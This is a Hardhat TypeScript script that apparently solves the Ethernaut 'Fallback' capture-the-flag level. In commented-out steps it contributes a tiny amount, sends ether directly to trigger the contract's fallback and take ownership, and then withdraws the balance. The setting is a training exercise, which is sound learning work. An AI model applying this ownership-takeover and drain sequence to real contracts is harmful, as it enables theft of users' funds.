// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
// When running the script with `hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { parseEther, parseUnits } from 'ethers/lib/utils';
import { ethers } from 'hardhat';
import { Fallback__factory } from "../typechain";


async function main(): Promise<void> {
  // Hardhat always runs the compile task when running scripts through it.
  // If this runs in a standalone fashion you may want to call compile manually
  // to make sure everything is compiled
  // await run("compile");
  // We get the contract to deploy
  const [deployer] = await ethers.getSigners();
  const fallbackAddress = "0x6E7733D5DF47af800525778B775B490A810Ad8e4"

  console.log(deployer.address);
  const FallbackFactory = new Fallback__factory(deployer);
  const fallback = await FallbackFactory.attach(fallbackAddress);
  console.log('fallback deployed to: ', fallback.address);

  /* sending some funds so that contributions[msg.sender] > 0 is true
  const tx = await fallback.contribute({value: parseEther("0.0001")})
  const receipt = await tx.wait()
  console.log(receipt)

  console.log((await fallback.owner()))
  */

  /* step 2: claiming the owner
  const tx = await deployer.sendTransaction({
    to: fallbackAddress, 
    value: parseUnits("0.0001", "ether"), 
    gasLimit: parseUnits("100000", "1")
  });
  const receipt = await tx.wait()
  console.log(receipt)
  
  console.log((await fallback.owner()))
  */

  /* claiimng the remaining funds
  const tx = await fallback.withdraw()
  const receipt = await tx.wait()
  console.log(receipt)

  console.log((await fallback.owner()))
  console.log((await ethers.provider.getBalance(fallbackAddress)).toString())
  */

} 

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error: Error) => {
    console.error(error);
    process.exit(1);
  });
